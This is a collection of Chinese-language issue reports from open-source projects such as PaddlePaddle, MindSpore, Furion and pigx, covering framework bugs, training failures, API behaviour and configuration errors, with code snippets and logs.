conv_transpose 相同的输入得到的输出不同,"conv_transpose gpu版本filter_size&gt;3的条件下固定输入和参数，多次运行得到的结果不同。（在Kernel里调试发现： 在cudnnConvolutionBackwardData之前打印的input和filter相同，经过cudnnConvolutionBackwardData计算之后的output不同） paddle环境:1.5.2和1.6.1都会出现。 测试代码： `import paddle.fluid as fluid def test(place, data): input = fluid.layers.data(dtype='float32', shape=[None, 128, 8, 8], name='data') param_attr = fluid.ParamAttr(name='tc_w', initializer=fluid.initializer.Constant(1.0), trainable=True) result = fluid.layers.conv2d_transpose(input, num_filters=128, bias_attr=None, param_attr=param_attr, filter_size=4, act=None) main_program=fluid.default_main_program()) import numpy import numpy as np numpy.random.seed(13) #data = numpy.loadtxt(""result_batch_norm_81.tmp_3.txt"").reshape((1, 128, 8, 8)).astype(np.float32) data = np.random.rand(1, 128, 8, 8).astype(np.float32) res_gpu = test(fluid.CUDAPlace(0), data) np.savetxt(""result1_c.txt"", res_gpu[0].reshape((-1, 1))) print res_gpu` 结果对比：   <code>: exe = fluid.Executor(place) exe.run(fluid.default_startup_program()) res, = exe.run(feed={'data':data}, fetch_list=[result]) return res"
mp2.1.0 设置 setSqlSelect 指定列，查询无数据，去掉setSqlSelect 设置后有数据,"生成的sql是ok的   <code>: setSqlSelect 部分去掉后kJobRecords有数据(数据库为 mariadb 10.1), List&lt;KJobRecord&gt; kJobRecords = ikJobRecordService.selectList(new EntityWrapper&lt;KJobRecord&gt;().where(""today={0}"", dt.toDate()).and(""record_status=1"").setSqlSelect(""quartz_id"")) 16:35:26,416 DEBUG selectList:159 - ==&gt; Preparing: SELECT quartz_id FROM k_job_record WHERE (today=? AND record_status=1) 16:35:26,441 DEBUG selectList:159 - ==&gt; Parameters: 2017-09-11 00:00:00.0(Timestamp) 16:35:26,444 DEBUG selectList:159 - &lt;== Total: 1"
在使用soapClient时没法对List<Map>进行转换,"JDK版本： 1.8.0_301 hutool版本： 5.7.11 在使用soapClient时没法对list进行转换   <code>: Map&lt;String, Object&gt; request = new HashMap&lt;&gt;(); List&lt;Trade&gt; orderTrades = trades.get(order.getId()); Map&lt;String, Object&gt; orderSalesTotal = createOrderSalesTotal(order, orderTrades); request.put(""header"", headerMap); request.put(""salestotal"", orderSalesTotal); List&lt;Map&lt;String, Object&gt;&gt; salesItems = createSalesItems(orderTrades); request.put(""salesitems"", salesItems); List&lt;Map&lt;String, Object&gt;&gt; salesTenders = createSalesTenders(order); request.put(""salestenders"", salesTenders); &lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/""&gt;&lt;/SOAP-ENV:Envelope&gt;&lt;SOAP-ENV:Header /&gt;&lt;SOAP-ENV:Body&gt; &lt;postsalescreate xmlns=""http://posme.the-place.com.cn:8080/chiatai/salestrans.asmx?wsdl""&gt; &lt;astr_request&gt; &lt;salestenders&gt;[{lineno=, tendercode=OT, baseamount=null, payamount=null}]&lt;/salestenders&gt; &lt;salesitems&gt;[{plucode=10610, lineno=1, itemcode=10610, qty=1, mallitemcode=1, iscounteritemcode=1, counteritemcode=1, storecode=A00001, netamount=0.36}]&lt;/salesitems&gt; &lt;/astr_request&gt; &lt;/postsalescreate&gt; &lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;"
对于webapi简单类型参数，是否可以以json方式提交,"Furion 版本号 1.19.9 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 希望可以实现如下功能： 代码或代码仓库 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: //API方法定义 path:xxx.xxx.xxx.xxx/abc [HttpPost] public IActionResult Do(string name,int age){ } //希望可以使用这种方式调用 var para=new {name=""123"",age=18}.ToJsonString(); client.Post(""url"",para)"
【众智】【计算-用户接口】LRN,LRN NN接口 对输入的通道维度进行Local Response Normalization。 NN接口 接口目录：mindspore/python/mindspore/nn/layer/basic.py input output depth_radius int 属性 bias float 属性 alpha float 属性 beta float 属性 norm_region str 属性 对标接口参考 PyTorch1.8.1接口： torch.nn.LocalResponseNorm https://pytorch.org/docs/1.8.1/generated/torch.nn.LocalResponseNorm.html 3. 异常处理 4. 算子反向 通过小算子拼接自动求解反向   <code>: class LRN(Cell):
SQLManager.select 方法在有mapper的情况下，clazz参数不能指定Map.class,"该方法在mapper为空的情况下，框架能将clazz=Map.class自动转换为CaseInsensitiveHashMap。 而mapper不为空时，框架就直接clazz.newInstance()了，而Map.class.newInstance()肯定是失败的了。   <code>: public &lt;T&gt; List&lt;T&gt; select(String sqlId, Class&lt;T&gt; clazz, Map&lt;String, Object&gt; paras,RowMapper&lt;T&gt; mapper)"
[ST][MS][NET][DeepFM][CPU]Accuracy[50%] can not reach 80.5%,"DeepFM网络在CPU环境训练，loss不收敛 / 硬件环境: /device CPU : -- MindSpore version :r1.8 commit_id:3232a15b -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_deepfm_criteo_train_infer_cpu_0001.py get code from models python train.py python eval.py 网络训练成功，性能精度达标 走给梁浩   <code>: epoch: 1 step: 1, loss is 0.7587274312973022 epoch: 1 step: 2, loss is 0.7662703394889832 epoch: 1 step: 3, loss is 0.760957658290863 epoch: 1 step: 4, loss is 0.752292811870575 epoch: 1 step: 5, loss is 0.7475745677947998 epoch: 1 step: 2582, loss is 0.5552747249603271 epoch time: 2544543.665 ms, per step time: 985.493 ms 2022-05-14 10:33:41 EvalCallBack metricdict_values([0.7748686332085719]); eval_time96s epoch: 2 step: 1, loss is 17.216726303100586 epoch: 2 step: 2, loss is 19.332529067993164 epoch: 2 step: 3, loss is 17.9759521484375 epoch: 2 step: 4, loss is 18.04741859436035 epoch: 2 step: 5, loss is 17.924306869506836 epoch: 2 step: 2582, loss is 26.181772232055664 epoch time: 2398606.182 ms, per step time: 928.972 ms 2022-05-14 11:14:58 EvalCallBack metricdict_values([0.7551491579228454]); eval_time78s epoch: 3 step: 1, loss is 27.178865432739258 epoch: 3 step: 2, loss is 27.779495239257812 epoch: 3 step: 3, loss is 27.12067413330078 epoch: 3 step: 4, loss is 28.134132385253906 epoch: 3 step: 2582, loss is 38.69501876831055 epoch time: 2490375.940 ms, per step time: 964.514 ms 2022-05-14 11:57:49 EvalCallBack metricdict_values([0.7601490558914715]); eval_time81s epoch: 4 step: 1, loss is 230.4585418701172 epoch: 4 step: 2, loss is 211.41343688964844 epoch: 4 step: 3, loss is 219.3279571533203 epoch: 4 step: 4, loss is 205.9843292236328 epoch: 4 step: 2582, loss is 209.04888916015625 epoch time: 2468978.532 ms, per step time: 956.227 ms 2022-05-14 12:40:18 EvalCallBack metricdict_values([0.7611537928897276]); eval_time79s epoch: 5 step: 1, loss is 233.1695098876953 epoch: 5 step: 2, loss is 235.14324951171875 epoch: 5 step: 3, loss is 217.84320068359375 epoch: 5 step: 4, loss is 201.576416015625"
[ST][MS][NET][LSTM][910]RuntimeError: Can not find any available kernel info for: DynamicRNN. Maybe the operator can not supported on Ascend platform,"LSTM网络在910环境训练报DynamicRNN算子错误 / 硬件环境: /device GPU : -- MindSpore version :r2.0 commit_id:2bab0a4c -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221017 MindSpore 版本：编译时间20221107121528 r2.0 commit_id:e139b694 (/): /mode graph test_ms_model_zoo_lstm_train_infer_ascend.py cd solution_test/remaining/test_scripts/mindspore/net/lstm/network python -m nose -s --nologcapture test_ms_model_zoo_lstm_train_infer_ascend.py 网络训练成功 走给焦锐   <code>: [TRACE] TDT(196065,python):2022-11-08-09:41:38.875.673 [status:Running] [log.cpp:154]Channel ""785de6bc-5f06-11ed-82b9-78b46a368b10"": Send Sample Files,[tensor_data_deliver.cpp:279:Send]7212 [CRITICAL] DEVICE(196065,ffff81c37010,python):2022-11-08-09:41:56.576.917 [mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_graph_optimization.cc:379] SetOperatorInfo] Can not find any available kernel info for: DynamicRNN. Maybe the operator can not supported on Ascend platform.The Function Call Stack:In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py:357/ outputs, h, c, _, _, _, _, _ = self.lstm(self.cast(x, self.dtype), \/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py:528/ output, h_t = self.rnn(pre_layer, h_i, seq_length, w_ih, w_hh, b_ih, b_hh)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py:573/ x_n, hx_n = self._stacked_dynamic_rnn(x, hx, seq_length)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py:573/ x_n, hx_n = self._stacked_dynamic_rnn(x, hx, seq_length)/ In file /home/jenkins0/solution_test/remaining/test_scripts/mindspore/net/lstm/network/test_ms_model_zoo_lstm_train_infer_ascend/src/lstm.py:59/ output, _ = self.encoder(embeddings)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:116/ out = self._backbone(data)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:379/ loss = self.network(*inputs)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py:101/ return self.network(*outputs)/ {'enable_modelarts': 'Whether training on modelarts, default: False', 'data_url': 'Dataset url for obs', 'train_url': 'Training output url for obs', 'data_path': 'Dataset path for local', 'output_path': 'Training output path for local', 'preprocess': 'whether to preprocess data.', 'aclimdb_path': '/home/workspace/mindspore_dataset//AclImdb/aclImdb', 'glove_path': 'path where the GloVe is stored.', 'preprocess_path': 'path where the pre-process data is stored.', 'ckpt_path': 'the path to save the checkpoint file.', 'pre_trained': 'the pretrained checkpoint file path.', 'device_target': 'the target device to run, support ""GPU"", ""CPU"". Default: ""Ascend"".', 'device_num': 'Use device nums, default is 1.', 'distribute': 'Run distribute, default is false.', 'enable_graph_kernel': 'Accelerate by graph kernel, default is true.'} [ERROR] ASCENDCL(196065,python):2022-11-08-09:42:02.608.580 [tensor_data_transfer.cpp:899]7190 acltdtSendTensor: [Push][Data]failed to send, tdt result = -1, device is 1, name is 785de6bc-5f06-11ed-82b9-78b46a368b10 [WARNING] DEVICE(196065,ffff0010f0f0,python):2022-11-08-09:42:02.619.319 [mindspore/ccsrc/plugin/device/ascend/hal/device/ascend_data_queue.cc:257] Push] Device queue thread had been interrupted by TdtHandle::DestroyHandle, you can ignore the above error: 'failed to send...'. In this scenario, the training ends first without using all epoch(s) data, and the data preprocessing is blocked by the data transmission channel on the device side. So we force the data transmission channel to stop. [WARNING] MD(196065,ffff81c37010,python):2022-11-08-09:42:02.619.631 [mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:93] ~DataQueueOp] preprocess_batch: 209; batch_queue: 2, 2, 1, 1, 0, 0, 0, 0, 0, 16; push_start_time: 2022-11-08-09:41:38.955.639, 2022-11-08-09:41:38.955.730, 2022-11-08-09:41:38.955.845, 2022-11-08-09:41:38.955.924, 2022-11-08-09:41:38.955.999, 2022-11-08-09:41:38.956.074, 2022-11-08-09:41:38.956.159, 2022-11-08-09:41:38.956.234, 2022-11-08-09:41:38.956.323, 2022-11-08-09:41:38.956.608; push_end_time: 2022-11-08-09:41:38.955.713, 2022-11-08-09:41:38.955.830, 2022-11-08-09:41:38.955.911, 2022-11-08-09:41:38.955.987, 2022-11-08-09:41:38.956.062, 2022-11-08-09:41:38.956.145, 2022-11-08-09:41:38.956.221, 2022-11-08-09:41:38.956.296, 2022-11-08-09:41:38.956.407, 2022-11-08-09:42:02.619.378. Traceback (most recent call last): File ""../../train.py"", line 134, in &lt;module&gt; train_lstm() File ""/home/jenkins0/solution_test/remaining/test_scripts/mindspore/net/lstm/network/test_ms_model_zoo_lstm_train_infer_ascend/src/model_utils/moxing_adapter.py"", line 108, in wrapped_func run_func(*args, **kwargs) File ""../../train.py"", line 130, in train_lstm model.train(config.num_epochs, ds_train, callbacks=cb, dataset_sink_mode=(config.device_target != ""CPU"")) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1062, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 99, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 624, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 702, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 620, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 940, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 914, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1383, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) RuntimeError: Can not find any available kernel info for: DynamicRNN. Maybe the operator can not supported on Ascend platform. ---------------------------------------------------- - The Function Call Stack: (For framework developers) ---------------------------------------------------- In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py:357/ outputs, h, c, _, _, _, _, _ = self.lstm(self.cast(x, self.dtype), \/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py:528/ output, h_t = self.rnn(pre_layer, h_i, seq_length, w_ih, w_hh, b_ih, b_hh)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py:573/ x_n, hx_n = self._stacked_dynamic_rnn(x, hx, seq_length)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/rnns.py:573/ x_n, hx_n = self._stacked_dynamic_rnn(x, hx, seq_length)/ In file /home/jenkins0/solution_test/remaining/test_scripts/mindspore/net/lstm/network/test_ms_model_zoo_lstm_train_infer_ascend/src/lstm.py:59/ output, _ = self.encoder(embeddings)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:116/ out = self._backbone(data)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py:379/ loss = self.network(*inputs)/ In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py:101/ return self.network(*outputs)/ ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/plugin/device/ascend/hal/hardware/ascend_graph_optimization.cc:379 SetOperatorInfo"
r.GetUrl()获取不带端口,"1. 您当前使用的版本 2. 您当前使用的框架版本？ 1.9.2 3. 更新到最新的框架版本是否能够解决问题？ 无法 4. 问题描述？ 如代码 func Get(r *ghttp.Request) { fmt.Println(""--Get--"", r.GetUrl()) } 当我设置了端口，如8199，正常访问是http://127.0.0.1:8199/get，但此时这里r.GetUrl()打印出来是没有端口的https://127.0.0.1/get 5. 您期望得到的结果？ r.GetUrl()的结果带端口，跟浏览器里显示的url一样 6. 您实际得到的结果？   <code>: go 1.12, win64"
"使用华为云昇腾芯片报warming:cannot find valid TBE kernel info, try to get aicpu kernel info","模型报这种类似warming，连续报了非常多个之后才开始跑模型，然后跑得特别慢，而且跑到一半之后，模型停止。 time是一个batch的time 跑到第4个batch，模型不动了 测试之后发现，只使用最简单的model进行前向传播求模型输出，不进行反向传播和求损失，模型一样跑得特别慢，怀疑是model前向传播过程出现问题。在cpu上，前向传播速度非常快。以下是测试前向传播的代码。 model定义：   <code>: [WARNING] DEVICE(93202,fffebaffd1e0,python):2021-10-14-12:35:29.593.936 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:493] SelectKernelInfo] The node [kernel_graph_11:[CNode]31{[0]: ValueNode&lt;PrimitivePy&gt; Cast, [1]: [Parameter]32}] cannot find valid TBE kernel info, try to get aicpu kernel info [WARNING] DEVICE(93202,fffebaffd1e0,python):2021-10-14-12:35:52.044.966 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:493] SelectKernelInfo] The node [kernel_graph_15:[CNode]40{[0]: ValueNode&lt;PrimitivePy&gt; Cast, [1]: [Parameter]41}] cannot find valid TBE kernel info, try to get aicpu kernel info train_iter = build_dataloader(train_data, config.batch_size, False) net = Model(config) print('-------train--------') for i, data in enumerate(train_iter.create_dict_iterator()): print(i) start_time = time() print(net(data['id'],data['ngram'])) end_time = time() print('time:' + str(end_time - start_time)) class Model(nn.Cell): def __init__(self, config): super(Model, self).__init__() self.config = config self.c_seed = 1.0 self.manifold = PoincareBall() self.concat = ops.Concat(1) if config.embedding_pretrained is not None: pass else: # emb = Tensor(xavier_normal(Tensor(np.random.random((config.n_vocab, config.embed)))), dtype=ms.float32) # test data emb = Tensor(xavier_normal(Tensor(np.random.random((500, config.embed)))), dtype=ms.float32) emb[0] = emb[0].fill(0) self.embedding = Parameter(emb, requires_grad=True, ) self.embedding.manifold = self.manifold self.embedding.c = self.c_seed # emb_wordngram = Tensor(xavier_normal(Tensor(np.random.random((config.bucket, config.embed)))), dtype=ms.float32) # test data emb_wordngram = Tensor(xavier_normal(Tensor(np.random.random((500, config.embed)))), dtype=ms.float32) emb_wordngram[0] = emb_wordngram[0].fill(0) self.embedding_wordngram = Parameter(emb_wordngram, requires_grad=True, ) self.embedding.manifold = self.manifold self.embedding.c = self.c_seed # 这里的drop传入参数意义与pytorch相反，在原文中传入default为0.0，也就是说在此处需要default为1.0 self.dropout = nn.Dropout(config.dropout) self.hyperLinear = MobiusLinear(self.manifold, config.embed, config.num_classes, c=self.c_seed) def construct(self, x_1, x_2): out_word = self.embedding[x_1] out_wordngram = self.embedding_wordngram[x_2] out = self.concat((out_word, out_wordngram)) out = self.manifold.einstein_midpoint(out, c=self.c_seed) out = self.hyperLinear(out) out = self.manifold.logmap0(out, self.c_seed) return out"
预测 API 文档中部分链接失效,预测 API 文档中部分链接失效 https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/fluid/inference/api/high_level_api_cn.md 中部分链接。 https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/fluid/inference/api/high_level_api.md 中 部分链接。   <code>: 详细代码参考 Reference
远程请求post List<T>数据时请求头无Content-Type内容导致415状态 不支持的媒体类型（UnSupported Media Type）,"Furion 版本号 4.8.0 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境 接口Post参数为List类型的数据时，请求头没有Content-Type值，即便特性定义Headers（Action特性、参数特性、Post特性中的ContentType赋值）都无法设定Content-Type值 远程请求Post数据自动/手动设置Content-Type为application/json 看过furion相关定义（Post特性）默认的Content-Type就是application/json但是不知道为什么我定义的可以添加Authorization到请求头，但是不能定义Content-Type到请求头。   <code>: public interface ITenantApiService : IHttpDispatchProxy { [Post(""https://localhost:7051/api/company/contacts"")] Task&lt;RESTfulResult&lt;bool&gt;&gt; AddContacts(List&lt;TenantCompanyContact&gt; contacts, [Headers(""Authorization"")] string token); [Interceptor(InterceptorTypes.Exception)] static void OnException(HttpClient client,HttpResponseMessage res,string errors) { } } ITenantApiService tenantApi = App.GetService&lt;ITenantApiService&gt;(); //直接使用App.GetService获取 var tenantContacts = new List&lt;TenantCompanyContact&gt;(); //定义List for(int i=1;i&lt;10;i++){ tenantContacts.Add(new TenantCompanyContact(){}); //添加数据 } Task.Run(() =&gt; { tenantApi.AddContacts(tenantContacts, jwt); //jwt是通过另一个接口生成的jwt串 });"
添加系统栏目失败，脚本报错,"[2017-09-07 11:51:48.226] [7252] [INFO] - SQL: INSERT INTO (,,,,,,,,,,,,,,,,,,,,, ,,,) VALUES ('aaa', 'aaa',0,0,10,'','','','','','','','2','1,2,3',1,1,1504756308166,1,NaN,'','',0,'' ,'',''), Time: 37ms { Error: ER_BAD_FIELD_ERROR: Unknown column 'NaN' in 'field list' at Query.Sequence._packetToError (E:\Project\Cmswing\node_modules\mysql\lib protocol\sequences\Sequence.js:52:14) 栏目图标界面上非必填，但数据库设置的是必填。   <code>: cmswing_category name title pid sort list_row meta_title keywords description tem plate_index template_lists template_detail template_edit model type allow_publish display create_time status icon groups documentsorts mold template_m_index template_m_lists template_m_detail"
持续运行超过12小时以后，登陆成功之后，刷新页面自动立即退出，token被删除,"pigx版本: 2.1.0 操作系统: centos 7.3 是否修改包名: 是 auth持续运行超过12小时以后，从h5登陆成功之后，然后刷新页面自动立即退出，token被删除，返回异常InvalidTokenException, Token was not recognised，麻烦帮忙看下是什么原因？   <code>: 2019-03-06 10:35:37,746 [XNIO-2 task-56] DEBUG [io.undertow.request.security] SecurityContextImpl.java:86 - Attempting to authenticate /oauth/token, authentication required: false 2019-03-06 10:35:37,746 [XNIO-2 task-56] DEBUG [io.undertow.request.security] SecurityContextImpl.java:247 - Authentication outcome was NOT_ATTEMPTED with method io.undertow.security.impl.CachedAuthenticatedSessionMechanism@23848ed8 for /oauth/token 2019-03-06 10:35:37,746 [XNIO-2 task-56] DEBUG [io.undertow.request.security] SecurityContextImpl.java:110 - Authentication result was ATTEMPTED for /oauth/token 2019-03-06 10:35:37,746 [XNIO-2 task-56] DEBUG [c.c.f.common.data.tenant.TenantContextHolderFilter] TenantContextHolderFilter.java:35 - 获取header中的租户ID&gt;为:null 2019-03-06 10:35:37,746 [XNIO-2 task-56] DEBUG [o.s.b.w.servlet.filter.OrderedRequestContextFilter] RequestContextFilter.java:114 - Bound request context to thread: HttpServletRequestImpl [ POST /oauth/token ] 2019-03-06 10:35:37,747 [XNIO-2 task-56] DEBUG [o.s.s.web.util.matcher.AntPathRequestMatcher] AntPathRequestMatcher.java:176 - Checking match of request : '/oauth/token'; against '/css/**' 2019-03-06 10:35:37,747 [XNIO-2 task-56] DEBUG [o.s.security.web.util.matcher.OrRequestMatcher] OrRequestMatcher.java:65 - Trying to match using Ant [pattern='/oauth/token'] 2019-03-06 10:35:37,747 [XNIO-2 task-56] DEBUG [o.s.s.web.util.matcher.AntPathRequestMatcher] AntPathRequestMatcher.java:176 - Checking match of request : '/oauth/token'; against '/oauth/token' 2019-03-06 10:35:37,747 [XNIO-2 task-56] DEBUG [o.s.security.web.util.matcher.OrRequestMatcher] OrRequestMatcher.java:68 - matched 2019-03-06 10:35:37,747 [XNIO-2 task-56] DEBUG [org.springframework.security.web.FilterChainProxy] FilterChainProxy.java:328 - /oauth/token?password=123456&amp;randomStr=34111551839744618&amp;code=cnyn&amp;grant_type=password&amp;username=admin&amp;scope=server at position 1 of 12 in additional filter chain; firing Filter: 'WebAsyncManagerIntegrationFilter' 2019-03-06 10:35:37,748 [XNIO-2 task-56] DEBUG [org.springframework.security.web.FilterChainProxy] FilterChainProxy.java:328 - /oauth/token?password=123456&amp;randomStr=34111551839744618&amp;code=cnyn&amp;grant_type=password&amp;username=admin&amp;scope=server at position 2 of 12 in additional filter chain; firing Filter: 'SecurityContextPersistenceFilter' 2019-03-06 10:35:37,748 [XNIO-2 task-56] DEBUG [org.springframework.security.web.FilterChainProxy] FilterChainProxy.java:328 - /oauth/token?password=123456&amp;randomStr=34111551839744618&amp;code=cnyn&amp;grant_type=password&amp;username=admin&amp;scope=server at position 3 of 12 in additional filter chain; firing Filter: 'HeaderWriterFilter' 2019-03-06 10:35:37,748 [XNIO-2 task-56] DEBUG [org.springframework.security.web.FilterChainProxy] FilterChainProxy.java:328 - /oauth/token?password=123456&amp;randomStr=34111551839744618&amp;code=cnyn&amp;grant_type=password&amp;username=admin&amp;scope=server at position 4 of 12 in additional filter chain; firing Filter: 'LogoutFilter' 2019-03-06 10:35:37,749 [XNIO-2 task-56] DEBUG [o.s.security.web.util.matcher.OrRequestMatcher] OrRequestMatcher.java:65 - Trying to match using Ant [pattern='/logout', GET] 2019-03-06 10:35:37,749 [XNIO-2 task-56] DEBUG [o.s.s.web.util.matcher.AntPathRequestMatcher] AntPathRequestMatcher.java:156 - Request 'POST /oauth/token' doesn't match 'GET /logout 2019-03-06 10:35:37,749 [XNIO-2 task-56] DEBUG [o.s.security.web.util.matcher.OrRequestMatcher] OrRequestMatcher.java:65 - Trying to match using Ant [pattern='/logout', POST] 2019-03-06 10:35:37,750 [XNIO-2 task-56] DEBUG [o.s.s.web.util.matcher.AntPathRequestMatcher] AntPathRequestMatcher.java:176 - Checking match of request : '/oauth/token'; against '/logout' 2019-03-06 10:35:40,983 [XNIO-2 task-62] INFO [o.s.s.oauth2.provider.endpoint.CheckTokenEndpoint] CheckTokenEndpoint.java:94 - Handling error: InvalidTokenException, Token was not recognised 2019-03-06 10:35:40,984 [XNIO-2 task-62] DEBUG [o.s.security.web.header.writers.HstsHeaderWriter] HstsHeaderWriter.java:129 - Not injecting HSTS header since it did not match the requestMatcher org.springframework.security.web.header.writers.HstsHeaderWriter$SecureRequestMatcher@788b867b 2019-03-06 10:35:40,984 [XNIO-2 task-62] DEBUG [o.s.w.s.m.m.annotation.HttpEntityMethodProcessor] AbstractMessageConverterMethodProcessor.java:278 - Written [error=""invalid_token"", error_description=""Token was not recognised""] as ""application/json"" using [org.springframework.http.converter.json.MappingJackson2HttpMessageConverter@189b5fb1]"
测试发现输入数据即使idx out of  【paddle.data_type】的dim也不会报错,"测试模型的输入层的网络结构如下： 在上述输入层定义中，我将query和title的integer_value_sequence维度定义成【维度5】，label维度定义成维度【2】 下面是reader.py的测试返回： 【问题1】：从上面yield的返回可以看见 [2, 6, 7, 14],与[12, 22, 8]的idx已经大于【维度5】，但是程序可以正常执行没有报错提示 【问题2】：label15已经大于维度【2】，但是程序可以正常执行没有报错提示 -------------------------------分界线------------------------------ -------------------------------分界线------------------------------ -------------------------------分界线------------------------------ 另外测试了sparse_binary_vector 这个不会报错 这个会报错 【问题3】：我理解type=paddle.data_type.sparse_binary_vector(5)中5的含义是是onehot编码的维度，那么在上述[0, 3, 4, 4 ,6]中，6的idx已经大于5，应该报错，但是实际上没有报错，反而在 [0, 3, 4, 4 ,4, 3]中，因为len( [0, 3, 4, 4 ,4, 3]) &gt;5, 所以报错了。 我理解[0, 3, 4, 4 ,4, 3]代表的onehot编码是[1,0,0,1,1]   <code>: query_data = paddle.layer.data(name=""query"", type=paddle.data_type.integer_value_sequence(5)) title_data = paddle.layer.data(name=""title"", type=paddle.data_type.integer_value_sequence(5)) if is_infer == False: label = paddle.layer.data(name=""label"", type=paddle.data_type.integer_value(2)) query_emb = paddle.layer.embedding(input=query_data, size=query_emb_dim) title_emb = paddle.layer.embedding(input=title_data, size=title_emb_dim) yield [2, 6, 7, 14], [12, 22, 8], 15 feeding = {""query"": 0, ""title"": 1, ""label"": 2} query_data = paddle.layer.data(name=""query"", type=paddle.data_type.sparse_binary_vector(5)) title_data = paddle.layer.data(name=""title"", type=paddle.data_type.sparse_binary_vector(5)) if is_infer == False: label = paddle.layer.data(name=""label"", type=paddle.data_type.integer_value(2)) yield [0, 3, 4, 4 ,9], [2,4,3], 8 yield [0, 3, 4, 4 ,4, 3], [2,4,3], 8"
请问fluid有类似v2版本的recurrent_group功能吗？,"似乎 “DynamicRNN”这个有点这个意思，但是它是否与等价呢？有没有相关的迁移文档或者代码介绍这个呢？ 我理解paddle以lod_tensor表示数据，必然需要一个方便处理变长数据的函数，以前是recurrent_group, 简单易懂，不知道fluid是怎样做的   <code>: recurrent_group"
我改了模块名称，工程名称，包名称，启动PigEurekaApplication、PigConfigApplication、PigGatewayApplication、PigAuthApplication都没有报错，能正常启动。启动PigAdminApplication的时候报一下的错误信息，求冷冷解决一下这个问题。我不知道是不是client.id的设置报错。,"pig版本:2 操作系统:win10 是否修改包名: 有 2019-06-21 16:43:10.937 ERROR [qiutian-upms,,,] 12752 --- [ restartedMain] o.s.b.d.LoggingFailureAnalysisReporter : APPLICATION FAILED TO START Description: Failed to bind properties under 'security.oauth2.client.client-secret' to java.lang.String: Action: Update your application's configuration 以上是报错信息，   <code>: Reason: Failed to bind properties under 'security.oauth2.client.client-secret' to java.lang.String ###问题描述（包括回显步骤、截图 ） ： () 此项没有直接关闭、不予解决"
使用load_inference_model读入数据,"input数据如下：一个是id、一个是id list 然后使用下面的save_inference_model保存模型 载入模型： 预测时候遇到问题： 在预测时候，data2tensor函数调用to_lodtensor将数据转化后给到模型,报如下错误： paddle.fluid.core.EnforceNotMet: enforce ids_dims.size() == 2 failed, 0 != 2 at [/paddle/paddle/fluid/operators/lookup_table_op.cc:43] PaddlePaddle Call Stacks:   <code>: query = fluid.layers.data( name=""query"", shape=[1], dtype='int64') query_char = fluid.layers.data( name=""query_char"", shape=[1], dtype='int64', lod_level=1) fluid.io.save_inference_model(epoch_model, [""query"", ""query_char""], predict, exe) [inference_program, feed_target_names, fetch_targets] = fluid.io.load_inference_model(model_path, exe) score = exe.run(inference_program, feed=data2tensor({""query"": 4, ""query_char"": [3,2,5]}, place), fetch_list=fetch_targets, return_numpy=True) def data2tensor(data, place): res = dict() res[""query""] = to_lodtensor(data[""query""], place) res[""query_char""] = to_lodtensor(data[""query_char""], place) return res def to_lodtensor(data, place): res = fluid.LoDTensor() res.set(data, place) return res"
